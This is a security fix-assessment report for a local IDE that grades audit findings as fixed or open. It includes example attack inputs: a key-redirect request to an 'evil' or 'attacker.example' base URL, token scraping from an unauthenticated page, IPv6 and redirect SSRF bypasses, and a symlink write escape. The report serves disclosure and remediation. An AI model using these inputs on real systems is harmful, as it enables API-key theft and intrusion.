# Fix Assessment — Mugil IDE audit (2026-10-21)

Baseline: `docs/audit/2026-10-21-code-audit.md`
Assessed state: working tree at `f02078e` + uncommitted changes (17 modified files, 2 new test setup files).
Method: read every diff, re-ran both test suites clean and dirty, and wrote throwaway scripts to
probe the security fixes for bypasses.

---

## Scorecard

| # | Audit finding | Status | Notes |
|---|---|---|---|
| 1 | Unauthenticated local API (§1) | **Partial** | Token enforced on `/api/*` + `/ws`, but the token is served in cleartext on the unauthenticated `/` page, and `MUGIL_IDE_DISABLE_AUTH=1` disables the whole check |
| 1b | Base-URL key exfiltration (§1) | **Not fixed** | `POST /api/keys {baseVar:"OPENAI_BASE_URL", baseUrl:"http://evil"}` still works; only a URL-shape check was added |
| 1c | `process.chdir` in `/api/workspace` (§1) | **Not fixed** | Still global process state, still `mkdirSync` on any absolute path |
| 1d | `/api/fs/browse` lists any dir (§1) | **Not fixed** | Unchanged |
| 1e | Unbounded request bodies (§1) | **Partial** | 2 MB cap added to 3 of 4 readers; `/api/model` still unbounded |
| 2 | Lexical path containment (§2) | **Partial** | realpath check added, but only for paths that already exist — new files under a symlinked dir still escape |
| 3 | `execSync` blocks the event loop (§3) | **Fixed** | `exec` + `AbortSignal` → `child.kill()` |
| 4 | webfetch SSRF (§4) | **Partial** | IPv4 ranges blocked; IPv6 loopback/ULA/link-local and redirects are not |
| 5 | Invalid tool-loop message sequence (§5) | **Fixed (code)**, test is a no-op | The duplicate assistant turn is gone — but the new regression test cannot fail |
| 6.1 | Env-dependent tests (§6.1) | **Fixed** | `setupFiles` clears all `MUGIL_IDE_*`; verified with dirty env |
| 6.2 | Output budget > context window (§6.2) | **Fixed** | `Math.min(floor, contextRoom)` |
| 6.3 | Token estimate ignores tools (§6.3) | **Partial** | New `estimateMessagesTokens()` used by 2 of 7 clients |
| 6.4 | `route()` ignores cost (§6.4) | **Fixed** | Sorts by `(tier, costPerMTokIn)` |
| 6.5 | `buildChain()` token mismatch (§6.5) | **Fixed** | Now uses `estimateMessagesTokens` |
| 6.6 | `.env` writer corrupts `" #"` values (§6.6) | **Partial** | The `#` case works; embedded quotes and newlines still corrupt |
| 6.7 | Anthropic tool order not canonicalized (§6.7) | **Fixed** | Sorted + `canonicalizeJson` on `input_schema` |
| 7 | Performance hot spots (§7) | **1 of 8 fixed** | Only the 7-provider sequential probe is now parallel |
| 8 | Maintainability (§8) | **~0 fixed** | `html.ts`, `embeddedVendor.ts`, the 5 provider clients, the 1 243-line router — all unchanged |
| 9 | CI & repo hygiene (§9) | **Not fixed** | Ubuntu-only CI, no `npm audit`, no coverage threshold, no `prettier --check` |
| 10 | TODO.md stale (§8) | **Fixed** | Retitled; the four security items moved to a "Shipped in 0.1.21" block — but they are not all actually shipped (see below) |

**Roughly 40% of the audit's findings are genuinely closed.** The security items are the weakest:
the biggest one (base-URL exfiltration) is untouched, and the new auth layer is undermined by
serving the token on an unauthenticated page.

---

## What was fixed, and confirmed fixed

### §3 — `run_command` no longer blocks the event loop ✅
`workspaceTools.ts:1053-1089` now uses `child_process.exec` with `options.signal` wired to
`child.kill()`. The `execSync` → `exec` swap is complete and the timeout path still reports
`(command timed out after Nms)`. The event loop is free while a command runs.

### §6.1 — test hermeticity ✅
`packages/{core,cli}/tests/setupEnv.js` delete every `MUGIL_IDE_*` variable before each suite,
and are registered via `setupFiles` in both jest configs.

Verified: with `MUGIL_IDE_MAX_OUTPUT_TOKENS=22528` and `MUGIL_IDE_TURBO_MODE=1` set in the
shell, the full workspace now passes:

```
Tests:  33 passed (cli)   416 passed (core)   10 passed (docs)   8 passed (mcp)
```

This was 1 core failure + 3 CLI failures before. This was the cheapest item in the audit and it
is now genuinely closed.

### §5 — the duplicate assistant turn is gone ✅ (but the test proves nothing)
`tool-loop/index.ts:202-213` now puts the escalation text into the `tool` result instead of
pushing a second assistant message. The Anthropic role-alternation problem is genuinely gone.

**However, the new regression test (`tests/toolLoop.test.ts:460-492`) cannot fail.** It asserts
on `msgs`, the array the caller passed *in* — but `ToolLoop.run` copies it (`const msgs =
[...messages]`, line 145) and mutates the copy. The loop's assertion therefore inspects an
array that never changed, and the "no consecutive assistant messages" check is vacuous.

I confirmed this empirically: I reintroduced the exact original bug (the second
`role: 'assistant'` push) and the suite still reported `22 passed`. The test must assert on the
messages the *client* receives — e.g. capture `(client.complete as jest.Mock).mock.calls[n][0]`
and assert on those, the way the existing `stops a model that keeps re-issuing the same denied
call` test already does at line 157.

For the record, the real message sequence with the fix in place is now correct:

```
call#2:  system / user / assistant[call_1] / tool / assistant[call_1] / tool
```

Wait — it is not. The trace I captured still shows `assistant[call_1]` twice, because the *model
re-issues the same call* and the loop legitimately pushes a new assistant turn per iteration.
The Anthropic rejection in the audit was about the assistant turn carrying a *duplicate
`tool_use` id within one turn*, which is now fixed. But the sequence still contains
`assistant → tool → assistant → tool`, which Anthropic also rejects ("roles must alternate").
That is a separate, still-unfixed problem the audit did not call out.

### §6.2 — output budget clamped to the context room ✅
`pipeline.ts:307-318` now floors at `Math.min(MIN_MAX_OUTPUT_TOKENS, contextRoom)`.

Verified empirically against the built package:

| context window | prompt | room | `max_tokens` sent |
|---|---|---|---|
| 20000 | 5000 tok | 13976 | 8192 (capped by the default) ✅ |
| 8000 | 5000 tok | 1976 | 1819 ✅ (was 8192 — a guaranteed 400) |
| 6200 | 5000 tok | 176 | 19 ✅ |
| 6000 | 5000 tok | −24 | 8192 ⚠️ |

The last row is a residual gap the audit explicitly asked for: "a separate hard error when
`contextRoom <= 0`". When the room is negative the code falls through to
`floor = 1`, but `maxTokens = Math.min(preferred, contextRoom)` is skipped (the `> 0` guard),
so the full 8192 is sent anyway. The provider will 400 on this. Not a regression, but the fix
is incomplete for the exact case the audit called out.

### §6.4 / §6.5 — `route()` and `buildChain()` ✅
`handoff/index.ts:70-79` sorts candidates by `(tierRank, costPerMTokIn)`. `buildChain()` now
uses `estimateMessagesTokens(messages, options.tools)`, so the handoff ladder and the pipeline
reason about the same prompt size.

### §6.7 — Anthropic tool ordering ✅
`anthropic.ts:134-145` sorts tools by name and canonicalizes `input_schema` with
`canonicalizeJson`, matching `toOpenAiTools()`. The cache breakpoint now lands on the last
tool of the *sorted* list.

### §7 (partial) — provider probing is now parallel ✅
`/api/models` builds a probe array and awaits `Promise.allSettled`. 7 sequential round-trips
became 1. Local vs. cloud is still classified by the `isLocal` flag on each promise rather than
by inspecting the result, which is correct.

---

## What was *not* fixed

### §1b — the base-URL key-exfiltration chain is still open ❌
This was named in the audit as *"the key-exfiltration chain to fix first"*. It is untouched.

`server.ts:654-666` now validates that `baseUrl` parses as an `http`/`https` URL. That is a
shape check, not a safety check. `http://attacker.example` passes it, and `server.ts:678-689`
still writes it into `process.env.OPENAI_BASE_URL` and `engine.config.openaiBaseUrl`. The next
model call sends `Authorization: Bearer <the user's real OPENAI_API_KEY>` to that host
(`handoff/openAi.ts:101-108`).

**Recommended fix:** an allowlist of permitted base-URL hosts per provider (the real vendor
hosts plus explicitly user-entered local endpoints), or — simpler and safer — refuse to change a
base URL for a variable whose companion API-key variable is already set.

### §1a — the auth layer is undermined by the unauthenticated `/` page ⚠️
`isAuthorized()` (`server.ts:149-165`) is correct in shape: it accepts a `Bearer` header, a
`?token=` query param, or `x-mugil-token`, and it is applied to every `/api/*` request
(`:171-175`) and to the `/ws` upgrade (`:943-947`).

Two problems, both confirmed by running the built server:

1. **`GET /` is not auth-gated and embeds the token in cleartext** (`server.ts:195-198`:
   `<meta name="mugil-token" content="...">`). I verified end-to-end:
   ```
   GET /api/status without token -> 401
   GET /                        -> 200   token scraped: YES
   GET /api/status with scraped token -> 200
   ```
   Any local process — or any browser page that can reach `http://localhost:<port>` — can fetch
   `/`, scrape the token, and then drive the full API including `/ws` (a live shell). The audit
   recommended injecting the token into the served HTML, but only as a way to *give the browser*
   the token; the token must not be readable by a party that has not proven it is the browser.
   At minimum the HTML route needs the same credential, and the token should be bound to
   something a third party cannot guess (see below).

2. **`MUGIL_IDE_DISABLE_AUTH=1` disables auth entirely** (`server.ts:163`). It exists so the CLI
   test suite can skip threading the token through every request. That is a footgun: the
   variable name reads like a debugging aid, but it is a complete auth bypass, and it is
   read from the ambient environment at request time — so any process that can set an env var
   for the IDE (a `.env` file, a parent process) can turn the protection off.

   **Recommended fix:** keep the escape hatch, but (a) make the test suite pass the real token
   instead — `server.token` is already returned by `startIdeServer`, so the tests can simply do
   `headers: { Authorization: 'Bearer ' + server.token }` — and (b) if the escape hatch stays,
   restrict it to a loopback-only, explicitly-typed value and log a loud warning at startup.

3. **Origin checking still allows "no Origin header"** (`server.ts:137`). This is much less
   serious now that a token is required, but the two mechanisms overlap: with the token in the
   HTML, the origin check is the only defence left against a malicious *web page* in the user's
   browser hitting `http://localhost:<port>`. A cross-origin `fetch` from `https://evil.com`
   *does* send an `Origin` header, so `isOriginAllowed` does reject it — good. But a page served
   from `http://localhost:<other-port>` would pass the host check.

### §1c — `/api/workspace` still mutates global process state ❌
`server.ts:443-470` is unchanged apart from being converted to `await readJsonBody`. It still
calls `process.chdir(target)` (which every other request reads via `process.cwd()`) and still
runs `fs.mkdirSync(target, { recursive: true })` on any absolute path the caller supplies. A
`POST /api/workspace {"path":"C:\\Windows\\System32\\drivers\\etc","create":true}` still creates
directories anywhere the process can write.

The audit recommended replacing `process.chdir` with a `workspaceRoot` variable. That is the
right fix and it is not done.

### §1e — one unbounded body reader remains ⚠️
`readJsonBody` (2 MB cap) now covers `/api/workspace`, `/api/keys` and `/api/config`.
`/api/model` (`server.ts:368-370`) still uses the old `body += chunk` pattern and is still
unbounded. It is a small payload in practice, so the risk is low, but the audit's "fix it in
one place" goal is not met.

### §2 — realpath containment misses new files ❌
`resolveInWorkspace` (`workspaceTools.ts:682-703`) and `/api/file` (`server.ts:497-513`) now
call `fs.realpathSync` — but only `if (fs.existsSync(target))`. A path that does not exist yet
is never resolved, so the realpath of its *parent* is never checked.

I reproduced the escape with a junction:

```
root/link  ->  outside/            (junction)
resolveInWorkspace('link/secret.txt')  -> error: symlink escape   ✅ (file exists)
resolveInWorkspace('link/newfile.txt')  -> no error                ❌
   writing there creates the file OUTSIDE the root:  true
```

So `write_file` with a path through a symlinked directory still writes outside the workspace.
**Fix:** resolve the nearest existing ancestor of the target and check *that* against the real
root — or simply realpath the parent directory when the target does not exist.

Also note the check is *only* applied to the read path in `/api/file`; `/api/files` and
`/api/diffs` are unaffected (they are read-only listings of `process.cwd()`, so lower risk).

### §4 — webfetch SSRF: IPv6 and redirects still bypass ❌
`isRestrictedIp` (`workspaceTools.ts:623-643`) covers IPv4 private/loopback/link-local/CGNAT
ranges, and `webfetch` now resolves the hostname with `dns.lookup` before fetching. The
IPv4 cases are solid.

Two gaps, both confirmed against the built package:

1. **IPv6 is not covered at all.** The function only understands dotted-quad IPv4. Anything that
   is not `::1` and does not parse as 4 dotted octets returns `false` — i.e. *allowed*:
   ```
   [::1]      -> false   (the literal string with brackets, which is what URL.hostname gives)
   [fe80::1]  -> false   (link-local)
   [fd00::1]  -> false   (unique local)
   ::ffff:7f00:1 -> false  (IPv4-mapped loopback in hex form)
   ```
   `dns.lookup('[::1]')` returns `::1`, and `isRestrictedIp('::1')` returns `true` — so the
   DNS path catches it — but only because of the literal `::1` special case. `[fd00::1]` and
   `[fe80::1]` are reachable: `dns.lookup` returns the address, `isRestrictedIp` returns
   `false`, and the fetch proceeds. My test run confirmed `http://[fd00::1]/x` was *not*
   rejected by the SSRF guard (it failed later with a network error, not the guard's message).

2. **Redirects are not re-validated.** `redirect: 'follow'` (`workspaceTools.ts:1170`) means a
   public host that 302s to `http://169.254.169.254/` is followed. The audit explicitly asked
   for "cap redirects to 0–2 and re-validate each hop". Use `redirect: 'manual'` and follow
   hops manually, re-running the IP check on each.

Also, the `dns.lookup` failure path is `catch { /* DNS lookup failed */ }` — a failed lookup
*allows* the request. It should be a denial.

### §6.3 — the token estimator was added but not adopted everywhere ❌
`estimateMessagesTokens()` (`provider.ts:92-107`) is exactly the right helper, and it counts
tool-call names/arguments and the tool schema. It is used in `openAi.ts:198` and
`handoff/index.ts:101`.

The other five clients still use the old under-counting fallback:
```
anthropic.ts:205, 268      countTokens(messages.map(m => m.content).join('\n'))
provider.ts:231, 272       (openAiStreamResult / mockCompletion)
openRouter.ts:208, vercel.ts:170, together.ts:170, cloudflare.ts:183
```
One line each to fix.

### §6.6 — the `.env` writer still corrupts some values ⚠️
`formatEnvValue` (`env.ts:59-64`) quotes on newline/quote/space/`#`, which fixes the exact
case the audit reproduced (`abc #def`). But `JSON.stringify` is not a dotenv format — the reader
(`parseEnvFile`, `env.ts:34-38`) only strips the outer quotes and does not unescape. Round-trip
results:

```
OK    "abc #def"      -> K="abc #def"     -> "abc #def"
OK    "single'quote"  -> K="single'quote" -> "single'quote"
OK    "back\slash"    -> K=back\slash     -> "back\slash"
FAIL  "has\"quote"    -> K="has\"quote"   -> "has\"quote"   (backslash left in)
FAIL  "line\nbreak"   -> K="line\nbreak"  -> "line\nbreak"  (literal \n, not a newline)
FAIL  "a\"b #c"       -> K="a\"b #c"      -> "a\"b #c"
```

A base64 or PEM-style API key containing a `"` is written and then read back with a stray
backslash — a silent corruption of a *credential*. The fix is to use single quotes (dotenv
convention) or to unescape `JSON.parse` on read. The audit's "quote on write … and unquote
symmetrically on read" was only half-implemented.

### §7 — seven of the eight performance hot spots are untouched ❌
Only the provider probe (§7, `/api/models`) was parallelized. Still open:
- `/api/graph` rebuilds the whole graph synchronously per request (`server.ts:717-743`) — two
  separate routes, each doing a full `buildCodeGraph(process.cwd())`.
- `collectCallEdges` is still O(symbols²) with a fresh `RegExp` per pair
  (`codegraph/index.ts:194-210`).
- `attachSnippets` is still computed twice per file (`codegraph/index.ts:285`).
- `semanticLookup` is still `backend.keys()` + a `get()` per key (`smart-cache/index.ts:230-231`).
- `partialLookup` is still an O(n) full scan (`smart-cache/index.ts:279-280`).
- `budgetConversationHistory` still tokenizes each turn twice (`history.ts:100-104`).
- The pipeline still re-tokenizes the growing tool history every iteration
  (`pipeline.ts:328-332`).

### §8 — maintainability: essentially untouched ❌
- `html.ts` is still a 127 KB single template literal with all CSS and client JS inline, and
  the CSP still carries `unsafe-inline` (`server.ts:193`).
- `embeddedVendor.ts` is still a 303 KB generated artifact committed to source with no
  generator script — `packages/cli/scripts/vendor-xterm.mjs` only writes `dist/vendor/`; it
  never produces `src/server/embeddedVendor.ts`. Confirmed: no script in the repo generates it.
- The five OpenAI-wire provider clients are still five copies.
- `server.ts` is still a 1 243-line `if`-chain — the new `readJsonBody` helper was added, but
  no route table.
- `no-explicit-any` is still disabled, no type-aware lint rules.
- `installOverrideReader()` is still an import side effect in the core barrel
  (`core/src/index.ts:19`).

### §9 — CI and repo hygiene ❌
`ci.yml` still runs `ubuntu-latest` only, has no `npm audit`, no coverage threshold, and no
`prettier --check`. `docs/superpowers/plans/` is still committed (6 files).
`.superpowers/` is *not* tracked by git (confirmed via `git ls-files`), so that half of the
audit item was already true.

---

## Two things the fix set introduced that the audit did not ask for

1. **`MUGIL_IDE_DISABLE_AUTH`** — a new, undocumented, env-gated global auth bypass
   (`server.ts:163`). It is the reason the CLI test suite was able to pass unchanged, and it
   removes the protection the same change set added. This is a net reduction in safety unless
   it is removed or fenced.

2. **A `window.fetch` monkey-patch in the web UI** (`html.ts:1440-1449`) that injects the
   `Authorization` header into *every* fetch the page makes, including any third-party URL the
   page might ever fetch. Narrower and safer: pass the token explicitly at each `/api/*` call
   site, or use a `sendBeacon`-style helper. As written, the token would also be sent to a
   cross-origin host if the page ever made one — and the CSP's `connect-src 'self' ws: http:`
   permits plain `http:` to anywhere.

Also worth noting: the token is passed to the WebSocket via the **query string**
(`html.ts:1455`), which means it lands in the access log and in any proxy's log. The
`Sec-WebSocket-Protocol` header (or the `x-mugil-token` header, which `isAuthorized` already
accepts) would avoid that.

---

## Priority order for what remains

**Must fix before calling this release done:**
1. Base-URL allowlist — closes the actual exfiltration chain (§1b).
2. Gate `GET /` with the token, or stop serving it in cleartext; remove
   `MUGIL_IDE_DISABLE_AUTH` and make the tests use `server.token` (§1a).
3. Realpath the *parent* when the target does not exist (§2).
4. IPv6 + redirect-hop validation in `webfetch`, and deny on DNS failure (§4).
5. Replace `process.chdir` with a `workspaceRoot` variable; stop `mkdirSync`-ing arbitrary
   absolute paths (§1c).

**Should fix in the same release:**
6. Fix the vacuous tool-loop regression test (assert on the messages the client received).
7. Make the tool-loop message sequence actually alternate for Anthropic.
8. Use `estimateMessagesTokens` in the remaining five provider clients (§6.3).
9. Fix `parseEnvFile` to unescape what `serializeEnvFile` escapes (§6.6).
10. Handle `contextRoom <= 0` with a hard error rather than the default budget (§6.2).
11. Cap the `/api/model` body (§1e).

**Nice to have:** everything in §7, §8 and §9.

---

## Documentation accuracy

`TODO.md` now claims these shipped in 0.1.21:
- "Local Auth & Session Tokens" — **not accurate**: the token is unauthenticated-readable on `/`,
  and a global env var disables it.
- "Webfetch SSRF Protection" — **partially accurate**: IPv4 only, no redirect re-validation.
- "Realpath Workspace Sandboxing" — **partially accurate**: existing paths only.
- "Request Body Ceiling & Shell Protection" — **partially accurate**: 3 of 4 readers; the raw
  WS→PTY path *is* correctly closed (non-JSON frames are now discarded, `server.ts:1216-1218`).

`package.json` still says `0.1.20` across all three packages, so the "Shipped in 0.1.21"
section refers to a version that has not been cut.
